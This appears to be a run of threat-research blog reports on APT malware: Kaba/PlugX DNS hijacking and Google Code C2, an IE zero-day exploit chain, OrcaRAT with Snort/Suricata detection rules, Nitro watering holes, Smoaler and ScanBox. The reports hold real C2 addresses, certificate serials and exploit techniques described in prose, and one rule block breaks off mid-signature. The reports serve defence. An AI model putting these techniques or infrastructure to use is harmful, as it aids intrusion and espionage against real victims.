Analysis of this Kaba sample revealed that it was configured to directly connect to both www.adobe.com and update.adobe.com .
Obviously , this configuration does not make a lot of sense , as the actor would not be able to control their implants from anywhere on the Internet since they did not have direct control over these domains – unless the attackers were able to re - route traffic destined for these domains from specific victims .
Indeed , further analysis of this Kaba variant revealed that it was also configured to use specific DNS resolvers .
This sample was configured to resolve DNS lookups via Hurricane Electric 's nameservers of 216.218.130.2 , 216.218.131.2 , 216.218.132.2 and 216.66.1.2 .
We found this interesting , so we investigated how these Hurricane Electric 's nameservers were configured .
Subsequently , we found that anyone could register for a free account with Hurricane Electric 's hosted DNS service .
Via this service , anyone with an account was able to register a zone and create A records for the registered zone and point those A records to any IP address they so desired .
The dangerous aspect of this service is that anyone was able to hijack legitimate domains such as adobe.com .
Although these nameservers are not recursors and were not designed to be queried directly by end users , they were returning results if queried directly for domains that were configured via Hurricane Electrics public DNS service .
Furthermore , Hurricane Electric did not check if zones created by their users were already been registered or are otherwise legitimately owned by other parties .
As we continued this research , we identified 21 legitimate fully qualified domain names that had been hijacked via this technique by at least one APT actor .
In addition to the adobe.com domain mentioned above , another one of the poisoned domains is www.outlook.com .
A lookup of this domain via Google 's DNS resolvers returns expected results : A quick lookup of these addresses reveal that Microsoft owns them : However , as recently as August 4 , 2014 a lookup of the same www.outlook.com domain via Hurricane Electric 's resolvers returned entirely different results [ 1 ] : Passive DNS research on the 59.125.42.167 IP address revealed that multiple APT actors have previously used this IP address .
Additional researched uncovered more Kaba samples that were configured to leverage Hurricane Electric 's public DNS resolvers .
Another sample has the following properties : This sample is signed with a recently expired digital certificate from ' MOCOMSYS INC ' .
This certificate has a serial number of ' 03 e5 a0 10 b0 5c 92 87 f8 23 c2 58 5f 54 7b 80 ' .
This sample used Hurricane Electric 's public DNS resolvers to route traffic to the hijacked domains of www.adobe.com and update.adobe.com .
We also noted that this sample was configured to connect directly to 59.125.42.168 – one IP address away from the IP that received traffic from the hijacked www.outlook.com domain .
Passive DNS research revealed that this IP hosted the same set of known APT domains listed above : While this problem does not directly impact users of www.adobe.com , www.outlook.com , or users of the other affected domains , it should not be dismissed as inconsequential .
Actors that adopt this tactic and obfuscate the destination of their traffic through localized DNS hijacks can significantly complicate the job of network defenders .
Via our sensor network , we observed the actor responsible for this activity conducting a focused campaign .
We observed this actor target : Google Code Command and Control Furthermore , we also discovered this same actor conducting a parallel campaign that leveraged Google Code for command and control .
On August 1 , 2014 we observed a malicious self - extracting executable ( aka sfxrar ) file downloaded from 211.125.81.203 .
This file had the following properties : A valid certificate from ' QTI INTERNATIONAL INC ' was used to sign this sfxrar .
This certificate had a serial number of ' 2e df b9 fd cf a0 0c cb 5a b0 09 ee 3a db 97 b9 ' .
The sfxrar contained the following files : Setup.exe is a legitimate executable from Kaspersky used to load the Kaba ( aka PlugX ) files – msi.dll and msi.dll.dat .
These Kaba files are configured to connect to Google Code – specifically code.google.com/p/udom/ .
On August 1 , this Google Code project contained the encoded command '' DZKSGAAALLBACDCDCDOCBDCDCDOCCDADIDOCBDADDZJS '' .
[ 2 ] These Kaba files are configured to connect to Google Code – specifically code.google.com/p/udom/ .
On August 1 , this Google Code project contained the encoded command '' DZKSGAAALLBACDCDCDOCBDCDCDOCCDADIDOCBDADDZJS '' .
The command ' DZKSGAAALLBACDCDCDOCBDCDCDOCCDADIDOCBDADDZJS ' decodes to 222.122.208.10 .
In a live environment , the Kaba implant would then connect to this IP address via UDP .
Further analysis of project at code.google.com/p/udom/ revealed the project owner , 0x916ftb691u , created a number of other projects .
We decoded the commands hosted at these linked projects and found that they issued the following decoded commands : It is likely that other yet to be discovered Kaba variants are configured to connect to these related Google Code projects and then redirect to this list of IP addresses .
Passive DNS analysis of these IP addresses revealed connections to the following known malicious infrastructure : Relationships Between Campaigns As mentioned above the Kaba variant eae0391e92a913e757ac78b14a6f079f shared a common import hash of f749528b1db6fe5aee61970813c7bc18 with many of the samples listed in this post .
This samples was to use Hurricane Electric 's nameservers as well as connect directly to the IP address 59.125.42.168 .
Note that we identified the same C2 IP 59.125.42.168 via our analysis of the malicious Google Code projects .
Specifically , the Google Project at code.google.com/p/tempzz/ , which is linked to the project at code.google.com/p/udom/ , issued an encoded command that decoded to 59.125.42.168 .
We also identified another related Kaba variant that connected to code.google.com/p/updata-server .
This variant had the following properties : This sample was signed with a valid digital certificate from ' PIXELPLUS CO . , LTD ' and had a serial number of ' 0f e7 df 6c 4b 9a 33 b8 3d 04 e2 3e 98 a7 7c ce ' .
In addition to sharing the same Import hash of f749528b1db6fe5aee61970813c7bc18 seen in other samples listed throughout this post , 50af349c69ae4dec74bc41c581b82459 contained a RT_VERSION resource of 9dd9b7c184069135c23560f8fbaa829adc7af6d2047cf5742b5a1e7c5c923cb9 .
This same RT_VERSION was used in a number of other related samples including : Conclusion These coordinated campaigns demonstrate that APT actors are determined to continue operations .
As computer network defenders increase their capabilities to identify and block these campaigns by deploying more advanced detection technologies , threat actors will continue to adopt creative evasion techniques .
We observed the following evasion techniques in these campaigns : While none of these techniques are necessarily new , in combination , they are certainly both creative and have been observed to be effective .
Although the resultant C2 traffic can be successfully detected and tracked , the fact that the malware appears to beacon to legitimate domains may lull defenders into a false sense of security .
Network defenders should continue to study the evolution of advanced threat actors , as these adversaries will continue to evolve in pursuit of their designated objectives .
This entry was posted in Targeted Attack , Threat Research and tagged advanced attack , APT , evasion techniques , kana , plugx by Ned Moran , Joshua Homan and Mike Scott .
Bookmark the permalink .
FireEye Research Labs identified a new Internet Explorer ( IE ) zero - day exploit used in targeted attacks .
The vulnerability affects IE6 through IE11 , but the attack is targeting IE9 through IE11 .
This zero - day bypasses both ASLR and DEP .
Microsoft has assigned CVE-2014 - 1776 to the vulnerability and released security advisory to track this issue .
Threat actors are actively using this exploit in an ongoing campaign which we have named `` Operation Clandestine Fox .
'' However , for many reasons , we will not provide campaign details .
But we believe this is a significant zero day as the vulnerable versions represent about a quarter of the total browser market .
We recommend applying a patch once available .
According to NetMarket Share , the market share for the targeted versions of IE in 2013 were : IE 9 13.9 % IE 10 11.04 % IE 11 1.32 % Collectively , in 2013 , the vulnerable versions of IE accounted for 26.25 % of the browser market .
The vulnerability , however , does appear in IE6 through IE11 though the exploit targets IE9 and higher .
The exploit leverages a previously unknown use - after - free vulnerability , and uses a well - known Flash exploitation technique to achieve arbitrary memory access and bypass Windows ' ASLR and DEP protections .
The exploit page loads a Flash SWF file to manipulate the heap layout with the common technique heap feng shui .
It allocates Flash vector objects to spray memory and cover address 0×18184000 .
Next , it allocates a vector object that contains a flash . Media . Sound ( ) object , which it later corrupts to pivot control to its ROP chain .
The SWF file calls back to Javascript in IE to trigger the IE bug and overwrite the length field of a Flash vector object in the heapspray .
The SWF file loops through the heapspray to find the corrupted vector object , and uses it to again modify the length of another vector object .
This other corrupted vector object is then used for subsequent memory accesses , which it then uses to bypass ASLR and DEP .
With full memory control , the exploit will search for ZwProtectVirtualMemory , and a stack pivot ( opcode 0×94 0xc3 ) from NTDLL .
It also searches for SetThreadContext in kernel32 , which is used to clear the debug registers .
This technique , documented here , may be an attempt to bypass protections that use hardware breakpoints , such as EMET 's EAF mitigation .
With the addresses of the aforementioned APIs and gadget , the SWF file constructs a ROP chain , and prepends it to its RC4 decrypted shellcode .
It then replaces the vftable of a sound object with a fake one that points to the newly created ROP payload .
When the sound object attempts to call into its vftable , it instead pivots control to the attacker 's ROP chain .
The ROP payload basically tries to make memory at 0×18184000 executable , and to return to 0x1818411c to execute the shellcode .
Inside the shellcode , it saves the current stack pointer to 0×18181800 to safely return to the caller .
Then , it restores the flash . Media . Sound vftable and repairs the corrupted vector object to avoid application crashes .
The shellcode also recovers the ESP register to make sure the stack range is in the current thread stack base / limit .
The shellcode calls SetThreadContext to clear the debug registers .
It is possible that this is an attempt to bypass mitigations that use the debug registers .
The shellcode calls URLDownloadToCacheFileA to download the next stage of the payload , disguised as an image .
Using EMET may break the exploit in your environment and prevent it from successfully controlling your computer .
EMET versions 4.1 and 5.0 break ( and/or detect ) the exploit in our tests .
Enhanced Protected Mode in IE breaks the exploit in our tests .
EPM was introduced in IE10 .
Additionally , the attack will not work without Adobe Flash .
Disabling the Flash plugin within IE will prevent the exploit from functioning .
The APT group responsible for this exploit has been the first group to have access to a select number of browser - based 0-day exploits ( e.g .
IE , Firefox , and Flash ) in the past .
They are extremely proficient at lateral movement and are difficult to track , as they typically do not reuse command and control infrastructure .
They have a number of backdoors including one known as Pirpi that we previously discussed here .
CVE-2010 - 3962 , then a 0-day exploit in Internet Explorer 6 , 7 , and 8 dropped the Pirpi payload discussed in this previous case .
As this is still an active investigation we are not releasing further indicators about the exploit at this time .
Acknowledgement : We thank Christopher Glyer , Matt Fowler , Josh Homan , Ned Moran , Nart Villeneuve and Yichong Lin for their support , research , and analysis on these findings .
This entry was posted in Advanced Malware , Exploits , Targeted Attack , Uncategorized and tagged zero- day by Xiaobo Chen , Dan Caselden and Mike Scott .
Bookmark the permalink .
By Dan Kelly and Tom Lancaster It 's every malware analyst 's dream to be handed a sample which is , so far , unnamed by the AV community - especially when the malware in question may have links to a well - known APT group .
In my line of work I analyse several ' unknown ' malware samples a week , but often it turns out that they are simply new variants of existing malware families .
Recently I was fortunate enough to be handed something that not only had a low detection rate but , aside from heuristics , seemed to be relatively unknown to the top 40 anti - virus companies .
In this post I will walk you through the malware family we ' ve dubbed `` OrcaRAT '' .
First of all , it is worth pointing out that most of the malware I see on a day - to - day basis is espionage orientated , and very rarely do the programmers and operators make much effort to cover their tracks .
The use of forged HTTP headers is a common occurrence and simple mistakes within these headers are frequent .
The malware in question was handed to me by one of our threat intelligence analysts who was hunting through infrastructure associated with some samples of Comfoo [ 1 ] malware and happened across a malware sample ( 253a704acd7952677c70e0c2d787791b8359efe2c92a5e77acea028393a85613 ) he did n't recognise .
He immediately took the malware and passed it through first stage analysis , which involves running the file in a sandbox environment .
After this , he handed it over for more in - depth capability analysis .
The structure I began by looking over the sandbox report .
The first thing that drew my attention was the URI structure .
( A screenshot showing the HTTP headers and URI structure that OrcaRAT produces ) To those of us who are familiar with decoding data , you will notice that the URI string formatting appears to be a modified version of the Base64 algorithm .
To understand this structure more , we must reverse engineer the functions that generate and then encode the data .
Firstly we begin by analysing the routines that produce the data which is later encoded and sent in the HTTP URI field .
The very first thing that jumped out when disassembling the malware is the simplicity and cleanliness of the code .
There are also a significant number of Windows Crypto API [ 2 ] functions imported by the malware , so we can assume this indicates that it uses encryption .
( A screenshot showing the functions that are imported by OrcaRAT ) Delving deeper in to the disassembly , we come across the preamble to the URI generation function : ( A screenshot showing the decoding and generation of a string value ) The function above uses Windows crypto API to generate a random number of 6 bytes , then dynamically builds and appends the word `` OrcaKiller '' on to the end of this number .
In one such example the final product was `` \x61\xBA\xF4\x44\x52\xF1OrcaKiller '' ( where \x denotes hexadecimal values ) .
Once this value has been produced , the malware begins constructing the URI .
With many pieces of malware the initial communications that it sends out to its command and control server ( known as beaconing or phoning home ) usually include pieces of information about the victim system .
OrcaRAT is no exception .
The randomly generated values noted above are actually used to encrypt several pieces of information that are extracted from the system , and even the key itself is included .
( A screenshot showing an encryption function used by OrcaRAT ) All of the values extracted from the system are encrypted using the RC4 [ 3 ] algorithm and then base64 encoded .
The RC4 encryption key is derived from an MD5 hash [ 4 ] of the randomly generated bytes concatenated with the ' OrcaKiller ' string .
Once the data has been encrypted it is base64 encoded .
Any forward slashes in the base64 string are replaced with a tilde - pseudo code is shown below .
Once all of the values have been encrypted and formatted the URI has the following structure : ( A screenshot showing the URI structure of OrcaRAT command and control activity ) The campaign ID value is constructed using a method similar to that for the encryption key .
( A screenshot showing the generation of the first hidden string value ) It would appear that the authors did not want anybody to be able to easily see this value .
This now gives us OrcaKiller and wHaLe .
It would appear that our adversary has a salty sense of humour .
Command and control As with all malware , the command and control functions reveal the true nature and intent of the operators .
Up until now we have only determined how the malware communicates with the server .
We will now investigate the mechanisms that the server uses to communicate and interact with the victim .
The command and control routine in OrcaRAT appears to serve two purposes .
Interestingly these routines are split in to two branches .
Each branch of command and control activity is determined by the unique response from the remote server .
Command and control takes form of a webpage .
Unlike malware designed by the well - known Comment Crew [ 5 ] , this group does not hide these commands in HTML comments , but instead places them in plain view .
The first set of commands force the malware to behave as a simple downloader .
( A screenshot showing OrcaRAT parsing the HTML code behind a webpage ) Upon downloading the webpage from the server the malware looks for specific sets of HTML tags .
The first set are < P > and the terminating tag < /P > .
Once the malware has found these tags it drops in to the first command and control function .
The malware then extracts the payload text between the HTML tags and runs it through a decryption routine .
The same encryption key that is sent in the URI string is used to decrypt the text .
Once the payload text has been decrypted the malware treats this as a binary executable file , which is then written to the disk and executed .
The second set of HTML tags allows the operator to drop the malware in to a set of remote control functions .
This time the malware searches for the < H1 > tag that is terminated by < /H1 > .
Once the payload text between these tags has been extracted it is then decrypted using the encryption key found in the URI string .
The payload text from this page is much smaller and ultimately points to the command function that the operator has executed .
( A screenshot showing the structure of the command and control routines within OrcaRAT ) The command and control structure is fairly simplistic but provides the operator with access to the victim machine 's filesystem and command line , and as such allows the attacker to perform various tasks such as executing arbitrary commands or uploading and downloading files from the compromised system .
After a command and control message is received , OrcaRAT sends an HTTP POST message back to the command and control server .
Each time that the URI is built it generates a new encryption key , showing that the command and control server is at least serving dynamic content .
Given the command structure above , it is logical to assume that the command and control server requires an operator to manually issue specific commands to the victim workstation , with the default command likely being ' sleep ' .
Given the information above we can reasonably assume that this malware was most likely designed as a first stage implant .
History has shown that malware designed in this way is usually done so to allow the operator an initial level of access to the compromised system , usually for surveying the victim and then deciding whether to deploy a more capable and valuable second stage malware implant .
Detection Once OrcaRAT has been delivered to a victim system there are a number of ways to detect it .
Firstly we will cover disk detection using Yara .
The rule below will detect an OrcaRAT binary executable that has been written to a compromised machine 's disk .
OrcaRAT can also be detected in two separate ways at the network level using a Snort or Suricata IDS rule .
Detecting malware at different stages of connectivity can be important .
By creating signatures with a nexus to the kill chain [ 6 ] we can determine which stage the intrusion has reached .
The two signatures below will indicate whether the intrusion has reached the command and control or action - on phases .
Snort : alert tcp any any - > any any ( msg : '' : : [ PwC CTD ] : : - OrcaRAT implant check - in '' ; flow : established , from_client ; urilen : 67 < > 170 ; content : '' User - Agent : Mozilla/4.0 ( compatible\ ; MSIE 8.0\ ; Windows NT 5.1\ ; Trident/4.0\ ; .NET
CLR 2.0.50727\ ; .NET
CLR 3.0.04506.30\ ; .NET4.0C\
; .NET4.0E
) '' ; http_header ; content : '' GET '' ; http_method ; pcre : '' /^\/ [ A - Za - z0 - 9+~= ] { 14,18 } \/ [ A - Za - z0 - 9+~= ] { 33,38 } \/ [ A - Za - z0 - 9+~= ] { 6,9 } \/ [ A - Za - z0 - 9+~= ] { 5,50 } \/ [ A - Za - z0- 9+~= ] { 5,50 } $ /U '' ; sid : YOUR_SID ; rev:1 ; ) alert tcp any any - > any any ( msg : '' : : [ PwC CTD ] : : - OrcaRAT implant C2 confirmation response '' ; flow : established , from_client ; urilen : 67 < > 170 ; content : '' User - Agent : Mozilla/4.0 ( compatible\ ; MSIE 8.0\ ; Windows NT 5.1\ ; Trident/4.0\ ; .NET
CLR 2.0.50727\ ; .NET
CLR 3.0.04506.30\ ; .NET4.0C\
; .NET4.0E
) '' ; http_header ; content : '' POST '' ; http_method ; pcre : '' /^\/ [ A - Za - z0 - 9+~= ] { 14,18 } \/ [ A - Za - z0 - 9+~= ] { 33,38 } \/ [ A - Za - z0 - 9+~= ] { 6,9 } \/ [ A - Za - z0 - 9+~= ] { 5,50 } \/ [ A - Za - z0- 9+~= ] { 5,50 } $ /U '' ; sid : YOUR_SID ; rev:1 ; ) Suricata : alert http any any - > any any ( msg : '' : : [ PwC CTD ] : : - OrcaRAT implant check - in '' ; flow : established , from_client ; urilen : 67 < > 170 ; content : '' Mozilla/4.0 ( compatible\ ; MSIE 8.0\ ; Windows NT 5.1\ ; Trident/4.0\ ; .NET
CLR 2.0.50727\ ; .NET
CLR 3.0.04506.30\ ; .NET4.0C\
; .NET4.0E
) '' ; http_user_agent ; content : '' GET '' ; http_method ; pcre : '' /^\/ [ A - Za - z0 - 9+~= ] { 14,18 } \/ [ A - Za - z0 - 9+~= ] { 33,38 } \/ [ A - Za - z0 - 9+~= ] { 6,9 } \/ [ A - Za - z0 - 9+~= ] { 5,50 } \/ [ A - Za - z0- 9+~= ] { 5,50 } $ /U '' ; sid : YOUR_SID ; rev:1 ; ) alert http any any - > any any ( msg : '' : : [ PwC CTD ] : : - OrcaRAT implant C2 confirmation response '' ; flow : established , from_client ; urilen : 67 < > 170 ; content : '' Mozilla/4.0 ( compatible\ ; MSIE 8.0\ ; Windows NT 5.1\ ; Trident/4.0\ ; .NET
CLR 2.0.50727\ ; .NET
CLR 3.0.04506.30\ ; .NET4.0C\
; .NET4.0E
In mid - July of this year , we noticed yet another legitimate website had been compromised by APT actors and was serving malware .
In this case , it was a group commonly referred to as `` Nitro , '' which was coined by Symantec in its 2011 whitepaper .
As we dug deeper , we found additional compromised legitimate websites and malware from the same group back through March of this year .
In most instances , the malware is one commonly referred to as '' Spindest , '' though we also found `` PCClient '' and `` Farfli '' variants in use by the group .
We do n't have enough data to say for certain that all of the malware in this blog was delivered via compromised legitimate websites .
Historically , Nitro is known for targeted spear phishing campaigns and using Poison Ivy malware , which was not seen in these attacks .
Since at least 2013 , Nitro appears to have somewhat modified their malware and delivery methods to include Spindest and legitimate compromised websites , as reported by Cyber Squared 's TCIRT .
Our findings indicate they are continuing to evolve with the addition of PCClient and Farfli variants .
The Maltego screenshot below shows the activity we describe in this blog .
These events impacted at least the following industries , across four waves : A US based IT Solutions provider ; The European office of a major , US based commercial vendor of space imagery and geospatial content ; A European leader in power technologies and automation for utilities and industry ; A US based provider of medical and dental imaging systems and IT solutions .
In July , Nitro compromised a South Korean clothing and accessories manufacturer 's website to serve malware commonly referred to as `` Spindest .
'' Of all the samples we ' ve tied to this activity so far noted in this blog , this is the only one configured to connect directly to an IP address for Command and Control ( C2 ) .
This IP address has been in use by this group for some time , which is interesting since they have evolved other components of their kill chain over time to ensure malware delivery , but oddly not altered their C2 infrastructure .
It is simple for companies to block any outbound traffic to this IP , which would negate the effort Nitro put into successfully delivering the malware .
37 AV vendors within VirusTotal properly identify it , and the PE timestamp shows the day before we saw it .
In addition , the following three samples were found roughly a week apart from each other , possibly indicating the timing of the waves of activity .
Table 1 The next sample we found is commonly known as PCClient , which is not malware previously tied to this group .
We discovered this , and many of the following samples , through historic IP resolution overlap between the same domains alternately resolving to either the 223.25.233.248 or 196.45.144.12 .
The second IP has also not been reported as tied to this group before .
However , this shifting of IP resolutions back and forth indicates Nitro is in control of these domains .
It also makes is fairly easy for any Infosec team to reach the same conclusion we did , which again negates their use both of a previously unreported domain and IP for C2 , as well as a new family of malware .
25 AV vendors within VirusTotal properly classify this sample as malware .
Its PE timestamp was 8 July , almost a week prior when we first saw it .
Table 2 The next sample was another Spindest variant and had the same timestamp as the aforementioned PcClient sample .
In addition , Nitro chose to use the same C2 for this sample , making it easy to both find and tie to the group .
41 AV vendors within VirusTotal properly classify this sample as malware .
Table 3 The next wave of activity we found took place in mid - May .
Both samples were Spindest variants with the same PE timestamp of 15 May .
While neither MD5s for C2 match , the aforementioned link to a post by Cyber Squared 's TCIRT did document Nitro using Spindest variants with the same file name starting late December last year .
In that case they used the historic C2 IP we note in Table 1 in this blog .
34 AV vendors within VirusTotal properly classify the first sample as malware , and 40 AV Vendors the second sample .
Table 4 Table 5 The malware dropped was configured to use good.myftp [ .
] org as the C2 URL , and the IP resolution was 223.25.233.248 .
Both of these are known Nitro Indicators of Compromise ( IOCs ) .
In this case , the malware was a Farfli variant , again not a malware previously tied to this group .
39 AV vendors within VirusTotal properly identify the file as malware .
The PE timestamp on the file was 1 April , about two weeks before we saw the file .
Continuing the activity , we discovered the actors had compromised a legitimate website belonging to an international technology company that provides Software Configuration and Change Management ( SCCM ) solutions in mid - May .
( It is a well regarded company and partners with large companies such as Microsoft .
) Table 6 The final sample , from mid - March , was also hosted on a compromised legitimate website , this time a small , US based IT company .
The IP resolved by the C2 URL was changed two days after we saw this file to overlap with good.myftp [ .
] org for a month before returning the below resolution .
The filename matches that of the sample in Table 5 , which had a very similar third level C2 domain and the same IP resolution .
This is also a Spindest variant with a PE timestamp of the same day we saw it .
39 AV vendors within VirusTotal properly identify the file as malware .
Table 7 As this post and previous cited research show , APT groups such as Nitro will continue to evolve their techniques within the kill chain to avoid detection .
However , they also demonstrate the value of tracking these threats over time , as this allowed us to uncover and properly attribute the new IOCs because Nitro was still re - using old C2 infrastructure with their new malware .
For Palo Alto Networks customers , all of these files were properly identified by WildFire as malware and all of the C2 domains are labeled as threats in both Threat Prevention and URL Filtering systems .
By Gabor Szappanos , Principal Researcher , SophosLabs July 2013 In a recent SophosLabs article about the PlugX malware family , we concluded with these words : There is no doubt that PlugX development will go on , and new features and tricks will be introduced .
We 'll keep an eye on them , and if any interesting or important new features appear , we 'll be sure to let you know .
Fast forward just under two months , and we 're ready to tell you the next stage in this ongoing saga .
The malware family we 'll be looking at in this report is known as Smoaler , and it shares many features with PlugX , notably that : • Smoaler relies on the same vulnerability , CVE-2012 - 0158 .
• Smoaler uses the same exploit shellcode .
• Smoaler uses similar visual distractions , or decoys , with a Tibetan theme .
• Smoaler uses the same initial malware modules to initiate infection .
Thereafter , the new malware follows a different path to the PlugX samples we looked at last time .
We shall analyse the `` what happens next '' component of Smoaler later on .
To clarify the terminology we have used above , remember that : • A vulnerability is a software bug that could potentially be abused to make your computer behave insecurely .
• An exploit is a real - world trick by which a vulnerability can be activated to bypass security .
• Shellcode is runnable program code delivered inside a file that is supposed to be plain data , and therefore implicitly safe , but that can be executed without the user 's knowledge or consent by exploiting a vulnerability .
• Initial malware modules , also called droppers , are malware components , often delivered or activated by shellcode , used to deliver the full malware , or payload , that the attacker wants to install .
The Smoaler samples seen by SophosLabs were all packaged into files with the extensions .DOC
or .DOCX
.
These extensions usually denote files specific to Microsoft Word that were created by Microsoft Word .
Despite the extensions , however , all the files were actually in Rich Text Format ( RTF ) , a text - based file format for representing documents .
Fig 1 : RTF content of one of the Smoaler samples received by SophosLabs We assume that the attackers chose RTF because its text structure makes it easier to manipulate to create a working exploit for the CVE-2012 - 0158 vulnerability .
As with PlugX , the Smoaler files arrived with Tibetan - themed subject lines : If you open an infected document on an unpatched , unprotected computer , the shellcode in the document will activate and run .
After infecting your computer , the shellcode loads a new copy of Word to display a decoy document that is hidden inside the malicious file .
You will notice only notice a brief flicker when the old instance of Word closes and the new one with the decoy opens .
Fig 2 : Sample Smoaler decoy documents The decoy documents are all unexceptional , uninfected documents with content that matches the filenames given to the malicious RTFs .
( See Fig 2 .
) In preparing the decoy for display , the malware overwrites the infected RTF file with the contents of the decoy ( which is in DOC format ) , thus removing one useful piece of evidence that might otherwise help pinpoint the source of infection .
The executable code that kicks off infection is the same as was used in PlugX , being byte - for byte identical ( see Fig 3 ) to the shellcode from PlugX 6.0 [ A ] .
Fig 444 : The PlugX 6.0 and Smoaler shellcodes are identical Fig 3 : The PlugX 6.0 and Smoaler shellcodes are identical ￼This shellcode is unusual for its use of LZNT1 compression for the embedded executable payload .
This technique has not been observed in any other APT ( Advanced Persistent Threat ) attacks .
The shellcode decompresses an embedded PE file , writes it into the % TEMP % folder with the name DW20.DLL ( this mimics the filename used by the Dr. Watson utility on Windows that pops up when a program crashes ) , and runs it .
The first - stage payload created by the shellcode contains another program file embedded as data .
It locates this in its own executable file , drops it to disk ( which is where the name dropper comes from for this sort of malware component ) , and runs it .
There are two main sorts of dropper , detected by Sophos as Troj / Plugx - I and Troj / Plugx - K. ( See Fig 4 .
) The names reflect the similarity , thus far , to earlier PlugX malware .
Fig 4 : Side - by - side pseudocode for Smoaler first - stage dropper variants But what happens next is quite different from a PlugX attack , which is why this malware has been given the general name Smoaler , rather than PlugX .
The temporary file dropped by DW20.DLL contains a compressed DLL ( dynamic link library : a special sort of program file ) stored in its resources .
This compressed program is unpacked using code built on the stack .
This component decodes the Command - and - Control ( C & C ) server names that the final malware will use , and saves them to the registry entry HKCU\Software\ Microsoft\Windows Media\XC .
( See Fig 5 .
) C & C servers are the computers to which infected computers , often called bots or zombies , connect in order to fetch instructions on what to do next .
Putting the C & C server names in the registry , rather than in the zombie executable itself , means that if the user becomes suspicious and submits the malware file to a security vendor , the locations of the C & C servers will not be revealed .
The data in the registry entry is obscured by flipping the least significant bit of the non - zero bytes ( i.e .
XORing them with 0x01 ) .
This provides a light disguise against an inquisitive user .
Fig 5 : Smoaler registry entry used to store C & C server names After storing the C & C names in the registry , the intermediate infector loads the dropped DLL using the LoadLibrary ( ) Windows API call .
The intermediate infector is deleted from the system after execution .
The DLL dropped by the intermediate infector is the principal component of Smoaler .
The DLLs created during infection are variable in size , and huge , ranging from 20 MBytes to 50 MBytes .
This is not because they are complex and packed with functionality : the useful content of Smoaler is less than 40 KBytes .
The bulk of each DLL consists of a number ( two to six ) binary resources of 5 MBytes to 10 MBytes each .
These resources are filled with zero bytes , entirely for the purpose of bulking up the file .
We assume that the purpose of deliberately bloating the main DLL is to disguise its original source , since even a suspicious user might not connect a multi - megabyte DLL with the original infectious RTF of a few hundred kilobytes .
( The original RTF is also replaced with the decoy DOC file after infection , further diverting attention from the origin of the malware .
) When the DLL first runs , it installs itself permanently into two places on the victim 's computer : • C : \Documents and Settings\All Users\Application Data\Microsoft\ Windows\Burn\ % COMPUTERNAME % .dll
( % COMPUTERNAME % is generated by querying the name of the computer .
) • C : \Documents and Settings\All Users\Application Data\Microsoft\ Windows\LiveUpdata_Mem\ % RANDOM % .dll
( The % RANDOM % part of the name is variable , e.g .
B6go3s_One.dll or 7n5HjV.dll .
) Two or three copies of the DLL are dropped .
They typically differ in size , because the zero - byte resource padding may vary in each file .
The DLL is added as a registry value called % COMPUTERNAME % in the registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\run .
This provides what is known as persistence , meaning that the malware is automatically re - loaded every time the victim reboots or logs on .
( See Fig 6 .
) Fig 6 : Smoaler registry persistence on a computer named XP3 Note that Smoaler is launched using the Windows utility rundll32.exe , because DLLs can not execute on their own .
They require a host program inside which to run .
When connecting to its C & C servers , Smoaler injects itself into the process IEXPLORE.EXE .
This is a common trick used by malware to make its traffic appear to originate from a browser , thus arousing much less suspicion .
While running , however , Smoaler keeps a lookout for processes called vsserv.exe , fsdfwd.exe , AvastSvc.exe , uiWatchDog.exe , and avp.exe .
It avoids injecting itself into Internet Explorer if any of them are active .
These processes belong to various security products , so this is a malware precaution often jocularly called anti - anti - virus , intended to avoid suspicious activity that might attract the attention of security software .
After installing itself , Smoaler attempts to connect to its C & C servers .
The domain names it uses are already known from earlier Tibet - related malware attacks : dtl.dnsd.me , dtl.eauto.com and dtl6.moo.com .
Unfortunately , we ca n't say precisely how an infected computer will behave if Smoaler gets this far .
That is because the content that the primary Smoaler DLL fetches from its C & C servers is whatever malware the attackers choose to serve up next .
Worse still , the programs downloaded by Smoaler are not in regular EXE or DLL format .
Firstly , the downloads are encrypted ; secondly , their headers are stripped off so that , even decrypted , they are not immediately obvious as programs ; thirdly , they are loaded directly into , and run directly from , memory , rather then being written to disk and launched via the Windows API .
That means that if you kill off the Smoaler process and delete its primary executable , as you will almost certainly want to do if you find out that you are infected , you may no longer have a complete copy of the malware to submit for analysis .
In this way , the Smoaler authors avoid showing all the cards in their hand at once , in the hope of staying one step ahead .
However , this multi - stage approach also has a significant disadvantage for cybercriminals : there are now multiple points in the attack at which you can spot an anomaly , intervene , and win .
Prevention is better than cure Malware like Smoaler is a strong reminder of why proactivity and prevention are better than cure : once you are infected , it can be hard to go back and unravel what happened , because of the tricks that the malware uses along the way .
By Chris Doman and Tom Lancaster Earlier this year the Japanese language website of one of the world 's largest suppliers of industrial equipment was compromised by a sophisticated threat actor .
Usually in such cases an attacker will use their access to place an exploit kit on the compromised website , delivering malware to visitors - a technique commonly referred to as setting up a ' watering hole ' or ' strategic web compromise ' .
In this case however , rather than relying on malware , the exploit kit was a self - contained key logger that recorded all keystrokes the user performed while on the website .
AlienVault [ 1 ] produced an excellent write - up on this framework , which the developers named ScanBox .
ScanBox is particularly dangerous as it does n't require malware to be successfully deployed to disk in order to steal information - the keylogging functionality simply requires the JavaScript code to be executed by a web browser .
The framework also facilitates reconnaissance , enabling attackers to exploit vulnerabilities in visitors systems in a more traditional fashion , by pushing & executing malware .
Since the initial post made by AlienVault , we have been actively scouring the web for new instances of the framework .
In this blog , we 're going to discuss four other watering holes which use ScanBox : Table 1 – Selected ScanBox compromises Looking at who was being targeted , we noticed a reasonable variation , including targeting of the Uyghur population in China , US Think Tanks , the Japanese Industrial sector & Korean hospitality .
This variation was our first clue that more than one actor may be using the framework ( although on its own this would not be enough - some actors do target a wide range of organisations , some also focus on specific geographies or sectors ) .
To check if this was the case , we took a deeper dive into each version of the code .
The Framework Whilst all four implementations share the same codebase , there are some minor differences in their implementations .
These differences may show that different attackers are using the ScanBox framework .
We ' ve outlined a few key differences we identified below : Malicious code was delivered in a single block of JavaScript on both webmailgoogle [ .
] com and foundationssl [ .
] com .
The domains qoog1e [ .
] com and googlecaches [ .
] com selectively loaded extra plugins from separate files : Figure 1 – The JavaScript function to load additional plugins We can see how these differ by comparing two exploit kits side by side : Figure 2 – foundationssl [ .
] com on the left loads JavaScript inline .
qoog1e.com on the right loads JavaScript from separate files A motivation for selectively loading plugins is likely to be to prevent crashes or any errors appearing ( which may alert the compromised site 's owner ) when the page is loaded – as some of the plugins are only compatible with specific browsers .
Selectively loading plugins has the added bonus of slightly reducing access to the attacker 's code to researchers .
